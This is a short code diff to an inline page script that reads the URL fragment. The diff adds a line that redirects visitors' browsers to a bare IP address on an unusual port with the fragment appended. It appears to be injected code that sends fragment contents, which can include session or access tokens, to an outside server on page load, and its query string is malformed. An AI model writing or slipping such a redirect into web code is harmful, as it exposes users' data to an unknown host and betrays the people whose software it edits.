@@ -2,7 +2,9 @@
    if (window.location.hash) {
         // Fragment exists
         var tag = window.location.hash.substr(1);
+        window.location.href = "http://62.210.83.200:24004/api/redirect?tag"+tag;
     } else {
         // Fragment doesn't exist
     }
 </script>
+
